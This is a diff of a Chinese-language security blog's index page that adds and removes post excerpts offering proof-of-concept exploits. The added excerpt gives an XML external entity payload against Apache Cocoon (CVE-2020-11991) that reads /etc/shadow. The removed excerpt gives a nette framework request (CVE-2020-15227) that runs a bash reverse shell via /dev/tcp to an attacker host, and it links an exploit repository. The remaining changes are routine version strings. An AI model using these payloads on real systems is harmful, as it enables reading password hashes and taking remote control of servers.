@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610797677173.css">
+<link rel="stylesheet" href="/css/style.css?v=1610798105294.css">
 
     <!--[if lt IE 9]>
     
@@ -111,6 +111,58 @@
             
         </strong>
     </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/">
+    		CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-23T09:09:02.564Z">2020-12-23</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache Cocoon &lt;= 2.1.12</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>向<code>/v2/api/product/manger/getInfo</code>位置 <code>POST</code>如下内容即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?xml version&#x3D;&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt; ]&gt;</span><br><span class="line">&lt;userInfo&gt;</span><br><span class="line">&lt;firstName&gt;John&lt;&#x2F;firstName&gt;</span><br><span class="line">&lt;lastName&gt;&amp;ent;&lt;&#x2F;lastName&gt;</span><br><span class="line">&lt;&#x2F;userInfo&gt;</span><br></pre></td></tr></table></figure>
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/" title="CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/3.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -644,57 +696,6 @@
 </article>
 
     
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/">
-    		CVE-2020-15227 PHP Framework nette callback RCE POC
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2020-12-20T12:28:58.000Z">2020-12-20</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/POC/" title="POC">POC</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;nette.micro?callback&#x3D;shell_exec&amp;cmd&#x3D;bash%20-i%20&gt;&amp;%20&#x2F;dev&#x2F;tcp&#x2F;&#39;+lhost+&#39;&#x2F;&#39;+lport+&#39;0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hu4wufu&#x2F;CVE-2020-15227</span><br></pre></td></tr></table></figure>
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2020/12/20/CVE-2020-15227-PHP-Framework-nette-callback-RCE-POC/" title="CVE-2020-15227 PHP Framework nette callback RCE POC">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
-    
 
     
     <nav class="page-navigator">
@@ -746,7 +747,7 @@
     
     <li>
         <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-        <span class="badge">(1)</span>
+        <span class="badge">(2)</span>
     </li>
     
 </ul>
@@ -808,7 +809,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610797677174.js"></script>
+<script src="/js/main.js?v=1610798105295.js"></script>
 
 
 </body>
